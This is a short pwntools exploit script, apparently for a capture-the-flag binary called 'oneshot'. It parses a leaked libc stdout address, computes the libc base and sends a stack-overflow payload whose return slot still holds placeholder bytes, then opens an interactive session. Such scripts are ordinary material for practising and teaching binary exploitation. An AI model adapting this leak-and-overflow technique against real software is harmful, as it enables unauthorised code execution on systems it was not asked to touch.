from pwn import *

context.update(log_level='debug')

p = process('oneshot')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
offset_stdout = libc.symbols['stdout']
log.info('offset_stdout: ' + hex(offset_stdout))
addr_libc_stdout = int(p.recvline().split(' ')[1], 16)
addr_libc_base = addr_libc_stdout - offset_stdout

log.info('addr_libc_stdout: ' + hex(addr_libc_stdout))
log.info('addr_libc_base: ' + hex(addr_libc_base))

raw_input('debug: ' + str(p.pid))
p.sendline('a'*0x18 + p64(0) + 'b'*8 + 'A'*8)

p.interactive()
